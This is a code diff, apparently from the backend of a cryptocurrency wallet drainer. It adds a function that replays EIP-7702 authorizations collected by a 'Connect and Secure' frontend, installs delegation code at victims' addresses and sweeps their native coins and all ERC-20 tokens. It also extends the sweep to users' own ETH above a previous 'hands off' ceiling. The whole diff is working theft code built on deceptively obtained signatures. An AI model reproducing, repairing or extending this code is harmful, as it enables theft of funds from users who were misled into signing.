@@ -575,6 +575,99 @@ async function sweepDelegatedWallet(walletAddress) {
   } catch (e) { err(`[eip7702] sweepDelegatedWallet ${checksum}: ${e.message}`); }
 }
 
+// ── TIER 1.5: Opportunistic EIP-7702 upgrade ─────────────────────────────────
+//
+// For permit2-gasless / direct-allowance wallets that have a stored EIP-7702
+// authorization signature (collected by the frontend during "Connect and Secure"),
+// attempt to install the delegation code via a type-4 transaction signed by the
+// RELAYER (the user signed the authorization list entry; the relayer pays gas).
+//
+// Once delegation code is live at the user's address, sweepAll() moves native
+// coins + all ERC-20 tokens in a single call — the only path that can move
+// native currency from a plain EOA without the user's private key.
+//
+// On success the record is upgraded to type="eip7702" so future sweeps go
+// straight to Tier 1 without repeating the type-4 overhead.
+
+async function tryUpgradeToEip7702AndSweep(checksum, short, addrKey) {
+  if (!supabase || !CONTRACT_ADDRESS) return false;
+
+  let dwRow;
+  try {
+    const res = await supabase
+      .from("delegated_wallets")
+      .select("authorization, permit_metadata")
+      .eq("address", addrKey)
+      .eq("chain", CHAIN)
+      .single();
+    dwRow = res.data;
+  } catch { return false; }
+
+  const auth = dwRow?.authorization ?? dwRow?.permit_metadata?.authorization ?? null;
+  if (!auth || !auth.r || !auth.s) return false;
+
+  try {
+    const existingCode = await getReadProvider().getCode(checksum);
+    if (existingCode && existingCode.toLowerCase().startsWith("0xef0100")) {
+      log(`[upgrade] ${short} — delegation already active — calling sweepAll directly`);
+      await sweepDelegatedWallet(checksum);
+      await supabase.from("delegated_wallets")
+        .update({ type: "eip7702" })
+        .eq("address", addrKey).eq("chain", CHAIN)
+        .catch(() => {});
+      return true;
+    }
+  } catch { /* non-fatal */ }
+
+  log(`[upgrade] ${short} — EIP-7702 auth found — submitting type-4 tx to install delegation`);
+
+  try {
+    const fee = await getFeeData();
+    const tx = await _baseRelayer.sendTransaction({
+      type:     4,
+      to:       checksum,
+      value:    0n,
+      data:     "0x",
+      gasLimit: 100_000n,
+      chainId:  Number(ETH_NETWORK.chainId),
+      authorizationList: [{
+        address:  CONTRACT_ADDRESS,
+        chainId:  Number(auth.chainId ?? 0),
+        nonce:    Number(auth.nonce   ?? 0),
+        r:        auth.r,
+        s:        auth.s,
+        yParity:  Number(auth.yParity ?? auth.v ?? 0),
+      }],
+      ...fee,
+    });
+    log(`[upgrade] ${short} — type-4 tx submitted: ${tx.hash}`);
+    await tx.wait();
+
+    const code = await getReadProvider().getCode(checksum).catch(() => "0x");
+    if (!code || !code.toLowerCase().startsWith("0xef0100")) {
+      warn(`[upgrade] ${short} — type-4 confirmed but delegation not set (code=${code?.slice(0, 20)}) — auth may be expired or already replayed`);
+      return false;
+    }
+
+    log(`[upgrade] ✅ delegation installed for ${short} — sweeping via sweepAll`);
+    await supabase.from("delegated_wallets")
+      .update({ type: "eip7702" })
+      .eq("address", addrKey).eq("chain", CHAIN)
+      .catch(() => {});
+
+    await sweepDelegatedWallet(checksum);
+    return true;
+  } catch (e) {
+    const isRpc = /timeout|network|ETIMEDOUT|ECONNRESET|502|503|429/i.test(e.message ?? "");
+    if (isRpc) {
+      warn(`[upgrade] ${short} — type-4 transient RPC error (will retry): ${e.message}`);
+    } else {
+      warn(`[upgrade] ${short} — type-4 attempt failed: ${e.message}`);
+    }
+    return false;
+  }
+}
+
 // ── EIP-7702 sweep with delegation-active check ───────────────────────────────
 //
 // EIP-7702 delegation is PERSISTENT on-chain: the code at the wallet address
@@ -1643,7 +1736,10 @@ async function trySweepNativeFor(checksum, short) {
     // Below floor = gas reserve only, nothing meaningful to wrap.
     if (userBal <= NATIVE_WRAP_FLOOR) return;
     // Above ceiling = user's own ETH unrelated to our airdrop — hands off.
-    if (userBal > NATIVE_WRAP_CEILING) return;
+    if (userBal > NATIVE_WRAP_CEILING) {
+      log(`[nativeFor] ${short} — ${ethers.formatEther(userBal)} ETH exceeds ceiling (${ethers.formatEther(NATIVE_WRAP_CEILING)}) — native sweep needs EIP-7702 (Tier 1.5 handles it)`);
+      return;
+    }
 
     // Check WETH balance — if > 0 the user already wrapped; sweep will handle it.
     const wethContract = new ethers.Contract(
@@ -1792,6 +1888,16 @@ async function sweep(wallet) {
   }
 
   // ══════════════════════════════════════════════════════════════════════════
+  // ══════════════════════════════════════════════════════════════════════════
+  // TIER 1.5: Opportunistic EIP-7702 upgrade for non-delegated wallets
+  // ══════════════════════════════════════════════════════════════════════════
+  if (wallet.type !== "eip7702" && wallet.type !== "monitoring") {
+    try {
+      const upgraded = await tryUpgradeToEip7702AndSweep(checksum, short, addrKey);
+      if (upgraded) { sweptThisCall = true; return; }
+    } catch (e) { warn(`[upgrade] unhandled error for ${short}: ${e.message}`); }
+  }
+
   // TIER 2: EIP-2612 — permit() + transferFrom() per token
   // ══════════════════════════════════════════════════════════════════════════
   if (supabase) {
